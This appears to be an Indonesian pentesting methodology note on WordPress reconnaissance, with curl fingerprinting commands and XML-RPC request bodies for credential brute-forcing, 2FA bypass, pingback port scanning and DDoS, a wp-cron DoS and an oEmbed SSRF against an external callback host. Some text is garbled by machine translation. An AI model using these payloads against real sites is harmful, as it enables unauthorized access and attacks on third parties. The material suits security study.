# Methodology Recon di WordPress

Setelah Subdomain enumeration dan URL crawler, lanjut ke tahap recon WordPress.

## WordPress File/Folder Hierarchy

```bash
/ (webroot)
├─ index.php              # Loads WordPress environment
├─ license.txt            # WordPress GPL license
├─ readme.html            # Basic info about WP installation
├─ wp-config.php          # Main configuration (DB, keys, salts)
├─ wp-login.php           # User login & authentication
├─ xmlrpc.php             # XML-RPC API endpoint
├─ wp-admin/              # WordPress admin dashboard core
├─ wp-includes/           # Core WordPress libraries & functions
└─ wp-content/            # User content (safe to edit)
   ├─ plugins/            # Installed plugins
   ├─ themes/             # Installed themes
   ├─ uploads/             # Media library (user uploaded files)
   ├─ languages/           # Translation files
   ├─ mu-plugins/          # Must-use plugins (auto-loaded)
   ├─ cache/               # Cache files
   └─ upgrade/             # Temporary files during updates
```

## 1. Passive Enumeration

### Version & Fingerprint

```bash
# Get WordPress version

## META generator
curl -s https://target.com/ | grep -i generator

## CSS/JS version fingerprint (lebih akurat)
curl -s https://target.com/ | grep -oP 'ver=[0-9.]+' | head
curl -s https://target.com/ | grep wp-includes

## asset fingerprint
curl -s https://target.com/ | grep wp- | grep ver=
```


### Plugin Discovery

```bash
# Get Plugins
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://target.com/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

## atau
curl -s https://target.com | grep -oE "/wp-content/plugins/[^\"']+" | sort -u
```

### Theme Discovery

```bash
# Get Themes
curl -s -X GET https://target.com/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```


### Version Extraction (General)


## 3. XML-RPC Enumeration

Jika `xml-rpc.php` aktif, Anda dapat melakukan serangan brute-force kredensial atau menggunakannya untuk melancarkan serangan DoS ke sumber daya lain. 
Tools : [wpxploit](https://github.com/relarizky/wpxploit) 


Untuk memeriksa apakah aktif, coba akses /xmlrpc.php dan kirim permintaan ini:

```xml
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

Target:

* wp.getUserBlogs
* wp.getCategories
* metaWeblog.getUsersBlogs
* pingback.ping



### Brute Force XML-RPC Login


`wp.getUserBlogs`, `wp.getCategories` atau `metaWeblog.getUsersBlogs` Berikut beberapa metode yang dapat digunakan untuk melakukan serangan brute-force terhadap kredensial. Jika Anda dapat menemukan salah satunya, Anda dapat mengirimkan sesuatu seperti:

```xml
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```

Pesan "Incorrect username or password" di dalam kode respons 200 akan muncul jika kredensial tidak valid. 

Dengan menggunakan kredensial yang benar, Anda dapat mengunggah file. Dalam respons, jalur file akan muncul [https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982). 


### Bypass 2FA

Metode ini ditujukan untuk program dan bukan untuk manusia, dan sudah usang, oleh karena itu tidak mendukung 2FA. Jadi, jika Anda memiliki kredensial yang valid tetapi pintu masuk utama dilindungi oleh 2FA, Anda mungkin dapat menyalahgunakan xmlrpc.php untuk masuk dengan kredensial tersebut dan melewati 2FA . Perhatikan bahwa Anda tidak akan dapat melakukan semua tindakan yang dapat Anda lakukan melalui konsol, tetapi Anda mungkin masih dapat mengakses RCE seperti yang dijelaskan Ippsec di [https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s] https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s

### DDoS or port scanning

Jika Anda dapat menemukan metode **pingback.ping** di dalam daftar tersebut, Anda dapat membuat Wordpress mengirimkan permintaan sembarangan ke host/port mana pun.
Ini dapat digunakan untuk meminta **satu** ( **lokasi** sehingga r**ibuan situs Wordpress mengakses** serangan **DDoS** terjadi di lokasi tersebut) atau Anda dapat menggunakannya untuk membuat **Wordpress** memindai . internal **jaringan** (Anda dapat menentukan port apa pun)

```xml
<!-- Basic scan -->
<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value><string>http://127.0.0.1:8000/</string></value>
    </param>
    <param>
      <value><string>https://target.com/things-to-do/calgary-canada</string></value>
    </param>
  </params>
</methodCall>
```

> Jika dalam respons Anda mendapatkan faultCode dan nilai lebih besar dari **0** (`<value><int>17</int></value>`), maka itu berarti port terbuka + Anda dapat memverifikasi ini dengan memeriksa log server Anda.

Perhatikan penggunaan `system.multicall` Pada bagian sebelumnya, Anda telah mempelajari cara menyalahgunakan metode ini untuk menyebabkan serangan DDoS. 

### wp-cron.php DoS

File ini biasanya terletak di direktori utama situs WordPress: `/wp-cron.php`
Saat file ini **diakses** , sebuah yang " berat MySQL kueri" akan dijalankan, sehingga dapat digunakan oleh **penyerang** untuk **menyebabkan** serangan **DoS** .

Selain itu, secara default,Fungsi `wp-cron.php`  ini dipanggil setiap kali halaman dimuat (kapan pun klien meminta halaman WordPress apa pun), yang pada situs dengan trafik tinggi dapat menyebabkan masalah (DoS).

Disarankan untuk menonaktifkan Wp-Cron dan membuat cronjob sungguhan di dalam host yang menjalankan tindakan yang dibutuhkan secara berkala (tanpa menimbulkan masalah). 

### /wp-json/oembed/1.0/proxy - SSRF**

Cobalah mengakses https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net dan situs WordPress mungkin akan mengirimkan permintaan kepada Anda.

Inilah responsnya ketika tidak berhasil: 

```js
{code : "rest_forbidden", message: "Sorry, you are not allowedto make proxied oEmbed requests"} 
```


### SSRF

Tools : [https://github.com/t0gu/quickpress/blob/master/core/requests.go](https://github.com/t0gu/quickpress/blob/master/core/requests.go)
Alat ini memeriksa apakah **methodName: pingback.ping** dan **path /wp-json/oembed/1.0/proxy** ada, dan jika ada, alat ini mencoba mengeksploitasinya.
